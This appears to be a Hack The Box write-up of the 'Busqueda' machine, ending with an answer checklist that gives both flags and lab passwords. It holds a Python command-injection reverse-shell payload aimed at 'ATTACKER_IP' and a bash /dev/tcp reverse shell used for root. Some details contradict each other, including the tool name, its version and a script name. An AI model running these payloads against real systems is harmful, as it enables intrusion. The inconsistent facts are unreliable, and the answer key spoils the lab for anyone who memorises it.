

# About

"Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user&amp;#039;s `Gitea` account. Further analysis of the system checkup script&amp;#039;s source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges."

## Skills Being Worked On

- Web Enumeration
- Linux Fundamentals
- Python Basics

## Skills Improved 

- Command Injection
- Source-Code Analysis
- Docker Basics

## Used Tools 

- Nmap
- Gitlab Repository Review
- 

# Information Gathering 

Scanned All TCP ports:

Enumerated open TCP ports: 

Enumerated top 200 UDP ports


# Enumeration 

## Nmap 

nmap -sT 10.129.228.217

Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-10 21:57 EDT
Nmap scan report for searchor.htb (10.129.228.217)
Host is up (0.0065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

## HTTP Port 80

- Visiting IP on port 80 resulted in a, "We're having a toruble finding this site"

Adding Target IP Address to "/etc/hosts"

	echo 10.129.228.217 Searcher.htb | sudo tee -a /etc/hosts

After adding the IP to the file we are able to reach and view the Searcher homepage


# Foothold

- Searcher is powered by Flask and Searchor 2.4.0

- Searcher 2.4.0 contains a vulnerability that can be found on the version release pages. 

- To Analyze the code more efficiently I need to download the Github repository with the unpatched vulnerability

		wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip 

After inspecting the Gitlab  patching notes, the vulnerability can be found on line 32 of the main.py file:

![](Pasted%20image%2020260710211736.png)


- Adding the installs required to run Searchor: 

		python3 -m pip install -U searchor

Ex. ![](Pasted%20image%2020260710212856.png)

The "search" command takes in four different parameters:
1) Engine
2) query
3) open
4) copy

- User input is directly required for Engine and Query parameters

After testing, we have found a workable epxloit on this Gitlab -> https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

We can use the "query" parameter to open a reverse shell on our local machine to gain initial access to the target IP

- Open a listener on our local machine

		nc -nlvp 1337

- Enter the exploit query on the Searcher website 

		', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

![](Pasted%20image%2020260714121358.png)

Initial Access gained!

To find the user.txt flag, we visit the home directory and print out the user.txt file contents:
		cd ~ | cat user.txt

# Privilege Escalation

After file hunting on the machine we find a .git file containing a username and password for "Cody" on a gitea page:

![](Pasted%20image%2020260714151457.png)

Logging into the machine with this password allows us to gain access to the "svc" user account:

		ssh svc@10.129.36.88 

		password: jh1usoih2bkjaspwe92


From a sudo perspective, the "svc" account is only allowed to run the below commands:

		/usr/bin/python3 opt/scripts/system-checkup.py *


After running the above command, we find there are multiple options for this command including 
- list running docker containers
- inspect docker containers
- full system checkup on containers

We would like to verify the available machines and the information on them:

![697](Pasted%20image%2020260714161154.png)

Using a JSON format for the code we are able to review the available DOCKER machines and find a Gitea Password on the gitea container:

![](Pasted%20image%2020260714162757.png)


Using the password we can now login to the Administrator Gitea account!


The Gitea Account shows that the full-checkup.sh file is being called directly within the /opt/scripts directory. 

Using this to my advantage we can create a temporary reverse shell file named, "full_checkup.sh" in the /tmp directory and have the file include a reverse bash shell:

![](Pasted%20image%2020260714180057.png)

Full-Checkup.sh:

	#! /bin/bash
	bash -i >& /dev/tcp/10.10.14.150/9001 0>&1


After running, we received a root shell with the final flag!!

![](Pasted%20image%2020260714180317.png)


## HTB Question Checklist

1)  How many TCP ports are open on the remote host?

	2

2) Which Python library/command line application is the web-application using to generate URLs?

	Searcher


3) What version of Searcher is running on Busqueda?

	2.4.2

4) Which HTTP POST parameter of the web-application vulnerable to code injection?

	 query

5) Submit the flag located in the svc user's home directory.

	dd60f8da363ef209c228ab8df96e5fdc

6) What is the password for cody user present on Busqueda?

	jh1usoih2bkjaspwe92

7) What is the full path of the Python script can be run with root privileges by the svc user on the box?

	/opt/scripts/system-checkup.py

8) What is the password for the administrator user on the Gitea application?

	yuiu1hoiu4i5ho1uh

9) What is the name of the script that is called by `system-checkup.py` using a relative path?

10) Submit the flag located in the root user's home directory.

	49e23394ef13e028089c7773a1323ab7












